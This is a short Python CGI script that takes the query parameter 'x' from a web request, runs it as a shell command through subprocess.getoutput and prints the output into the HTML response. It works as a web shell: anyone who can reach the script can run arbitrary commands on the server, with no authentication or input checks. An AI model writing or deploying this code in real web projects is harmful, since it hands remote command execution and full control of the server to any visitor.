#! /usr/bin/python3
import cgi
import subprocess

#header part
print("content-type:text/html")
print()

#query string --> f
f = cgi.FieldStorage()
cmd = f.getvalue("x")
op = subprocess.getoutput(cmd)
print(op)
